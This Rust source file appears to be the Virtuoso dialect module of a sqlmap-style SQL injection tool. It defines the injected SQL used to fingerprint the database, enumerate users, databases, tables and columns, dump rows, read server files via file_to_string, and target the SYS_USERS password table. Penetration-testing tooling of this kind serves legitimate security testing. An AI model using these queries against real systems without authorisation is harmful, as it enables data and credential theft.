use crate::Dialect;
use sqlmap_core::dbms_kind::Dbms;

pub struct VirtuosoDialect;
impl Dialect for VirtuosoDialect {
    fn dbms(&self) -> Dbms { Dbms::Virtuoso }
    fn banner_query(&self) -> &'static str { "sys_stat('st_dbms_ver')" }
    fn current_user_query(&self) -> &'static str { "USER" }
    fn current_db_query(&self) -> &'static str { "DB_NAME()" }
    fn hostname_query(&self) -> &'static str { "sys_stat('st_dbms_name')" }
    fn is_dba_query(&self) -> &'static str { "(SELECT 1 FROM SYS_USERS WHERE U_NAME=USER AND U_DAV_ENABLE=1)" }
    fn list_dbs(&self) -> &'static str { "SELECT DB_NAME FROM DB.DBA.SYS_DB" }
    fn list_tables(&self, _db: &str) -> String { "SELECT TABLE_NAME FROM DB.DBA.SYS_TABLES".into() }
    fn list_columns(&self, _db: &str, t: &str) -> String { format!("SELECT COLUMN_NAME FROM DB.DBA.SYS_COLS WHERE TABLE_NAME='{t}'") }
    fn count_rows(&self, _db: &str, t: &str) -> String { format!("SELECT COUNT(*) FROM {t}") }
    fn dump_rows(&self, _db: &str, t: &str, cols: &[&str], _start: usize, count: usize) -> String {
        let cols = if cols.is_empty() { "*".into() } else { cols.join(",") };
        format!("SELECT TOP {count} {cols} FROM {t}")
    }
    fn file_read(&self, p: &str) -> String { format!("file_to_string('{p}')") }
    fn file_write(&self, _h: &str, _d: &str) -> String { String::new() }
    fn os_cmd(&self, _c: &str) -> String { String::new() }
    fn substr(&self, e: &str, p: usize, l: usize) -> String { format!("substring(({e}),{p},{l})") }
    fn ord(&self, c: &str) -> String { format!("ASCII({c})") }
    fn concat(&self, p: &[&str]) -> String { p.join("||") }
    fn sleep(&self, _s: u32) -> String { "1=1".into() }
    fn password_table(&self) -> &'static str { "SYS_USERS" }
}
